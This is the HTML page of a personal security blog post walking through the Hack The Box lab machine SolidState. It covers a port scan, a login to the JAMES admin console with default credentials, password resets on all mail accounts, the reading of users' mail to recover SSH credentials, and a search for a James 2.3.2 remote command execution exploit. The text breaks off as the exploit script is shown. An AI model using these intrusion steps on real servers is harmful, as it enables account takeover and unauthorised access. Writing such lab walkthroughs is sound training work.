@@ -1,0 +1,543 @@
+<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="theme" content="Chirpy v2.7.2"><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="Hack The Box - SolidState (Without Metasploit)" /><meta name="author" content="rizemon" /><meta property="og:locale" content="en_US" /><meta name="description" content="Just bloggin cyber security related content." /><meta property="og:description" content="Just bloggin cyber security related content." /><link rel="canonical" href="https://rizemon.github.io/posts/solidstate-htb/" /><meta property="og:url" content="https://rizemon.github.io/posts/solidstate-htb/" /><meta property="og:site_name" content="rizemon’s blog" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-01-15T00:05:00+08:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Hack The Box - SolidState (Without Metasploit)" /><meta name="twitter:site" content="@rizemon" /><meta name="twitter:creator" content="@rizemon" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"rizemon"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://rizemon.github.io/posts/solidstate-htb/"},"description":"Just bloggin cyber security related content.","url":"https://rizemon.github.io/posts/solidstate-htb/","@type":"BlogPosting","headline":"Hack The Box - SolidState (Without Metasploit)","dateModified":"2021-01-15T00:05:00+08:00","datePublished":"2021-01-15T00:05:00+08:00","@context":"https://schema.org"}</script><title>Hack The Box - SolidState (Without Metasploit) | rizemon's blog</title><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="preload" href="/assets/css/post.css" as="style"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="/assets/js/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/portfolio.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">rizemon's blog</a></div><div class="site-subtitle font-italic">Cyber Security Enthusiast.</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/tabs/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tabs/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/tabs/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/tabs/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT ME</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/rizemon" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/rizemon" aria-label="twitter" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['',''].join('@')" aria-label="email" class="order-5" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" class="order-6" > <i class="fas fa-rss"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Hack The Box - SolidState (Without Metasploit)</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hack The Box - SolidState (Without Metasploit)</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Fri, Jan 15, 2021, 12:05 AM +0800" > Jan 15, 2021 <i class="unloaded">2021-01-15T00:05:00+08:00</i> </span> by <span class="author"> rizemon </span></div><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1992 words">11 min</span></div></div><div class="post-content"><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/solidstate.png" alt="" height="414px" width="615px" /></p><h1 id="configuration">Configuration</h1><p>The operating system that I will be using to tackle this machine is a Kali Linux VM.</p><p>What I learnt from other writeups is that it was a good habit to map a domain name to the machine’s IP address so as that it will be easier to remember. This can done by appending a line to <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"10.10.10.51 solidstate.htb"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
+</pre></table></code></div></div><h1 id="reconnaissance">Reconnaissance</h1><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+75
+76
+77
+78
+79
+80
+81
+82
+83
+</pre><td class="rouge-code"><pre><span class="nv">$ </span>rustscan <span class="nt">--accessible</span> <span class="nt">-a</span> solidstate.htb <span class="nt">-r</span> 1-65535 <span class="nt">--</span> <span class="nt">-sT</span> <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-Pn</span>
+File limit higher than batch size. Can increase speed by increasing batch size <span class="s1">'-b 1048476'</span><span class="nb">.</span>
+Open 10.10.10.51:25
+Open 10.10.10.51:22
+Open 10.10.10.51:80
+Open 10.10.10.51:110
+Open 10.10.10.51:119
+Open 10.10.10.51:4555
+Starting Script<span class="o">(</span>s<span class="o">)</span>
+Script to be run Some<span class="o">(</span><span class="s2">"nmap -vvv -p  "</span><span class="o">)</span>
+
+Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-01-14 13:49 UTC
+NSE: Loaded 151 scripts <span class="k">for </span>scanning.
+NSE: Script Pre-scanning.
+NSE: Starting runlevel 1 <span class="o">(</span>of 3<span class="o">)</span> scan.
+Initiating NSE at 13:49
+Completed NSE at 13:49, 0.00s elapsed
+NSE: Starting runlevel 2 <span class="o">(</span>of 3<span class="o">)</span> scan.
+Initiating NSE at 13:49
+Completed NSE at 13:49, 0.00s elapsed
+NSE: Starting runlevel 3 <span class="o">(</span>of 3<span class="o">)</span> scan.
+Initiating NSE at 13:49
+Completed NSE at 13:49, 0.00s elapsed
+Initiating Connect Scan at 13:49
+Scanning solidstate.htb <span class="o">(</span>10.10.10.51<span class="o">)</span> <span class="o">[</span>6 ports]
+Discovered open port 22/tcp on 10.10.10.51
+Discovered open port 110/tcp on 10.10.10.51
+Discovered open port 25/tcp on 10.10.10.51
+Discovered open port 80/tcp on 10.10.10.51
+Discovered open port 119/tcp on 10.10.10.51
+Discovered open port 4555/tcp on 10.10.10.51
+Completed Connect Scan at 13:49, 0.01s elapsed <span class="o">(</span>6 total ports<span class="o">)</span>
+Initiating Service scan at 13:49
+Scanning 6 services on solidstate.htb <span class="o">(</span>10.10.10.51<span class="o">)</span>
+Completed Service scan at 13:49, 11.03s elapsed <span class="o">(</span>6 services on 1 host<span class="o">)</span>
+NSE: Script scanning 10.10.10.51.
+NSE: Starting runlevel 1 <span class="o">(</span>of 3<span class="o">)</span> scan.
+Initiating NSE at 13:49
+Completed NSE at 13:50, 11.09s elapsed
+NSE: Starting runlevel 2 <span class="o">(</span>of 3<span class="o">)</span> scan.
+Initiating NSE at 13:50
+Completed NSE at 13:50, 0.07s elapsed
+NSE: Starting runlevel 3 <span class="o">(</span>of 3<span class="o">)</span> scan.
+Initiating NSE at 13:50
+Completed NSE at 13:50, 0.00s elapsed
+Nmap scan report <span class="k">for </span>solidstate.htb <span class="o">(</span>10.10.10.51<span class="o">)</span>
+Host is up, received user-set <span class="o">(</span>0.0068s latency<span class="o">)</span><span class="nb">.</span>
+Scanned at 2021-01-14 13:49:40 UTC <span class="k">for </span>22s
+
+PORT     STATE SERVICE     REASON  VERSION
+22/tcp   open  ssh         syn-ack OpenSSH 7.4p1 Debian 10+deb9u1 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b <span class="o">(</span>RSA<span class="o">)</span>
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCp5WdwlckuF4slNUO29xOk/Yl/cnXT/p6qwezI0ye+4iRSyor8lhyAEku/yz8KJXtA+ALhL7HwYbD3hDUxDkFw90V1Omdedbk7SxUVBPK2CiDpvXq1+r5fVw26WpTCdawGKkaOMYoSWvliBsbwMLJEUwVbZ/GZ1SUEswpYkyZeiSC1qk72L6CiZ9/5za4MTZw8Cq0akT7G+mX7Qgc+5eOEGcqZt3cBtWzKjHyOZJAEUtwXAHly29KtrPUddXEIF0qJUxKXArEDvsp7OkuQ0fktXXkZuyN/GRFeu3im7uQVuDgiXFKbEfmoQAsvLrR8YiKFUG6QBdI9awwmTkLFbS1Z
+|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 <span class="o">(</span>ECDSA<span class="o">)</span>
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBISyhm1hXZNQl3cslogs5LKqgWEozfjs3S3aPy4k3riFb6UYu6Q1QsxIEOGBSPAWEkevVz1msTrRRyvHPiUQ+eE<span class="o">=</span>
+|   256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 <span class="o">(</span>ED25519<span class="o">)</span>
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMKbFbK3MJqjMh9oEw/2OVe0isA7e3ruHz5fhUP4cVgY
+25/tcp   open  smtp        syn-ack JAMES smtpd 2.3.2
+|_smtp-commands: solidstate Hello solidstate.htb <span class="o">(</span>10.10.XX.XX <span class="o">[</span>10.10.XX.XX]<span class="o">)</span>, 
+80/tcp   open  http        syn-ack Apache httpd 2.4.25 <span class="o">((</span>Debian<span class="o">))</span>
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.25 <span class="o">(</span>Debian<span class="o">)</span>
+|_http-title: Home - Solid State Security
+110/tcp  open  pop3        syn-ack JAMES pop3d 2.3.2
+119/tcp  open  nntp        syn-ack JAMES nntpd <span class="o">(</span>posting ok<span class="o">)</span>
+4555/tcp open  james-admin syn-ack JAMES Remote Admin 2.3.2
+Service Info: Host: solidstate<span class="p">;</span> OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+NSE: Script Post-scanning.
+NSE: Starting runlevel 1 <span class="o">(</span>of 3<span class="o">)</span> scan.
+Initiating NSE at 13:50
+Completed NSE at 13:50, 0.00s elapsed
+NSE: Starting runlevel 2 <span class="o">(</span>of 3<span class="o">)</span> scan.
+Initiating NSE at 13:50
+Completed NSE at 13:50, 0.00s elapsed
+NSE: Starting runlevel 3 <span class="o">(</span>of 3<span class="o">)</span> scan.
+Initiating NSE at 13:50
+Completed NSE at 13:50, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>22.67 seconds
+</pre></table></code></div></div><h1 id="enumeration-1">Enumeration (1)</h1><h2 id="port-80-apache-httpd-2425-debian">Port 80 <code class="language-plaintext highlighter-rouge">Apache httpd 2.4.25 ((Debian))</code></h2><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/solidstate1.png" alt="" /></p><p>It seems that this website belongs to a company called “Solid State Security”. Unfortunately, there is actually nothing of importance here.</p><h2 id="port-4555-james-remote-admin-232">Port 4555 <code class="language-plaintext highlighter-rouge">JAMES Remote Admin 2.3.2</code></h2><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre><span class="nv">$ </span>nc <span class="nt">-v</span> solidstate.htb 4555   
+solidstate.htb <span class="o">[</span>10.10.10.51] 4555 <span class="o">(</span>?<span class="o">)</span> open
+JAMES Remote Administration Tool 2.3.2
+Please enter your login and password
+</pre></table></code></div></div><p>We are instantly prompted for credentials According to online, the default credentials was <code class="language-plaintext highlighter-rouge">root:root</code>. With it, we are able to successfully login!</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre><td class="rouge-code"><pre>Login <span class="nb">id</span>:
+root
+Password:
+root
+Welcome root. HELP <span class="k">for </span>a list of commands
+</pre></table></code></div></div><p>If we use the <code class="language-plaintext highlighter-rouge">listusers</code> features, we see that there are 5 users on this service.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre><td class="rouge-code"><pre>listusers
+Existing accounts 5
+user: james
+user: thomas
+user: john
+user: mindy
+user: mailadmin
+</pre></table></code></div></div><p>As <code class="language-plaintext highlighter-rouge">root</code> on the service, we are able to change the passwords of users.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre><td class="rouge-code"><pre>setpassword james password
+Password <span class="k">for </span>james reset
+setpassword thomas password
+Password <span class="k">for </span>thomas reset
+setpassword john password
+Password <span class="k">for </span>john reset
+setpassword mindy password
+Password <span class="k">for </span>mindy reset
+setpassword mailadmin password
+Password <span class="k">for </span>mailadmin reset
+</pre></table></code></div></div><h2 id="port-110-james-pop3d-232">Port 110 <code class="language-plaintext highlighter-rouge">JAMES pop3d 2.3.2</code></h2><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre><td class="rouge-code"><pre><span class="nv">$ </span>telnet solidstate.htb 110 
+Trying 10.10.10.51...
+Connected to solidstate.htb.
+Escape character is <span class="s1">'^]'</span><span class="nb">.</span>
++OK solidstate POP3 server <span class="o">(</span>JAMES POP3 Server 2.3.2<span class="o">)</span> ready 
+</pre></table></code></div></div><p>Using the usernames we found and the passwords we set for them, we can login and check out each of their mails.</p><p>Upon logging in as <code class="language-plaintext highlighter-rouge">john</code>, we see that there is a mail talking about sending <code class="language-plaintext highlighter-rouge">mindy</code> her temporary password.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+</pre><td class="rouge-code"><pre>USER john
++OK
+PASS password
++OK Welcome john
+list
++OK 1 743
+1 743
+<span class="nb">.</span>
+retr 1
++OK Message follows
+Return-Path: &lt;mailadmin@localhost&gt;
+Message-ID: &lt;9564574.1.1503422198108.JavaMail.root@solidstate&gt;
+MIME-Version: 1.0
+Content-Type: text/plain<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>us-ascii
+Content-Transfer-Encoding: 7bit
+Delivered-To: john@localhost
+Received: from 192.168.11.142 <span class="o">([</span>192.168.11.142]<span class="o">)</span>
+          by solidstate <span class="o">(</span>JAMES SMTP Server 2.3.2<span class="o">)</span> with SMTP ID 581
+          <span class="k">for</span> &lt;john@localhost&gt;<span class="p">;</span>
+          Tue, 22 Aug 2017 13:16:20 <span class="nt">-0400</span> <span class="o">(</span>EDT<span class="o">)</span>
+Date: Tue, 22 Aug 2017 13:16:20 <span class="nt">-0400</span> <span class="o">(</span>EDT<span class="o">)</span>
+From: mailadmin@localhost
+Subject: New Hires access
+John, 
+
+Can you please restrict mindy<span class="s1">'s access until she gets read on to the program. Also make sure that you send her a tempory password to login to her accounts.
+
+Thank you in advance.
+
+Respectfully,
+James
+</span></pre></table></code></div></div><p>If we login as <code class="language-plaintext highlighter-rouge">mindy</code>, we see 2 mails, one of which containing <code class="language-plaintext highlighter-rouge">SSH</code> credentials!</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+</pre><td class="rouge-code"><pre>USER mindy
++OK
+PASS password
++OK Welcome mindy
+list
++OK 2 1945
+1 1109
+2 836
+<span class="nb">.</span>
+retr 1 
++OK Message follows
+Return-Path: &lt;mailadmin@localhost&gt;
+Message-ID: &lt;5420213.0.1503422039826.JavaMail.root@solidstate&gt;
+MIME-Version: 1.0
+Content-Type: text/plain<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>us-ascii
+Content-Transfer-Encoding: 7bit
+Delivered-To: mindy@localhost
+Received: from 192.168.11.142 <span class="o">([</span>192.168.11.142]<span class="o">)</span>
+          by solidstate <span class="o">(</span>JAMES SMTP Server 2.3.2<span class="o">)</span> with SMTP ID 798
+          <span class="k">for</span> &lt;mindy@localhost&gt;<span class="p">;</span>
+          Tue, 22 Aug 2017 13:13:42 <span class="nt">-0400</span> <span class="o">(</span>EDT<span class="o">)</span>
+Date: Tue, 22 Aug 2017 13:13:42 <span class="nt">-0400</span> <span class="o">(</span>EDT<span class="o">)</span>
+From: mailadmin@localhost
+Subject: Welcome
+
+Dear Mindy,
+Welcome to Solid State Security Cyber team! We are delighted you are joining us as a junior defense analyst. Your role is critical <span class="k">in </span>fulfilling the mission of our orginzation. The enclosed information is designed to serve as an introduction to Cyber Security and provide resources that will <span class="nb">help </span>you make a smooth transition into your new role. The Cyber team is here to support your transition so, please know that you can call on any of us to assist you.
+
+We are looking forward to you joining our team and your success at Solid State Security. 
+
+Respectfully,
+James
+<span class="nb">.</span>
+retr 2 <span class="se">\</span>
++OK Message follows
+Return-Path: &lt;mailadmin@localhost&gt;
+Message-ID: &lt;16744123.2.1503422270399.JavaMail.root@solidstate&gt;
+MIME-Version: 1.0
+Content-Type: text/plain<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>us-ascii
+Content-Transfer-Encoding: 7bit
+Delivered-To: mindy@localhost
+Received: from 192.168.11.142 <span class="o">([</span>192.168.11.142]<span class="o">)</span>
+          by solidstate <span class="o">(</span>JAMES SMTP Server 2.3.2<span class="o">)</span> with SMTP ID 581
+          <span class="k">for</span> &lt;mindy@localhost&gt;<span class="p">;</span>
+          Tue, 22 Aug 2017 13:17:28 <span class="nt">-0400</span> <span class="o">(</span>EDT<span class="o">)</span>
+Date: Tue, 22 Aug 2017 13:17:28 <span class="nt">-0400</span> <span class="o">(</span>EDT<span class="o">)</span>
+From: mailadmin@localhost
+Subject: Your Access
+
+Dear Mindy,
+
+
+Here are your ssh credentials to access the system. Remember to reset your password after your first login. 
+Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. 
+
+username: mindy
+pass: P@55W0rd1!2@
+
+Respectfully,
+James
+
+<span class="nb">.</span>
+</pre></table></code></div></div><h2 id="port-22-openssh-74p1">Port 22 <code class="language-plaintext highlighter-rouge">OpenSSH 7.4p1</code></h2><p>Now, we can login using the credentials <code class="language-plaintext highlighter-rouge">mindy:P@55W0rd1!2@</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre><span class="nv">$ </span>ssh mindy@solidstate.htb
+mindy@solidstate:~<span class="nv">$ </span><span class="nb">id</span>
+<span class="nt">-rbash</span>: <span class="nb">id</span>: <span class="nb">command </span>not found
+</pre></table></code></div></div><p>However, we realise we are in a <code class="language-plaintext highlighter-rouge">rbash</code> shell and we can only <code class="language-plaintext highlighter-rouge">cat</code>, <code class="language-plaintext highlighter-rouge">env</code> and <code class="language-plaintext highlighter-rouge">ls</code>.</p><h1 id="usertxt">user.txt</h1><p>The user flag is in <code class="language-plaintext highlighter-rouge">mindy</code>’s home directory.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>mindy@solidstate:~<span class="nv">$ </span><span class="nb">cat </span>user.txt
+0510XXXXXXXXXXXXXXXXXXXXXXXXXXXX
+</pre></table></code></div></div><h1 id="enumeration-2">Enumeration (2)</h1><p>As I was unable to breakout of <code class="language-plaintext highlighter-rouge">rbash</code> with the current commands I have, I decided to look for alternatives. Using <code class="language-plaintext highlighter-rouge">searchsploit</code>, I found exploits relating to the version of <code class="language-plaintext highlighter-rouge">James</code> running on the machine.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre><td class="rouge-code"><pre><span class="nv">$ </span>searchsploit james 2.3.2
+<span class="nt">--------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+ Exploit Title                                                      |  Path
+<span class="nt">--------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+Apache James Server 2.3.2 - Insecure User Creation Arbitrary File W | linux/remote/48130.rb
+Apache James Server 2.3.2 - Remote Command Execution                | linux/remote/35513.py
+<span class="nt">--------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+</pre></table></code></div></div><h1 id="exploitation-1">Exploitation (1)</h1><p>After copying the script for the exploit <code class="language-plaintext highlighter-rouge">Apache James Server 2.3.2 - Remote Command Execution</code>, I modified the payload that is to be executed such that a reverse shell will be executed.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">cat </span>35513.py 
+...
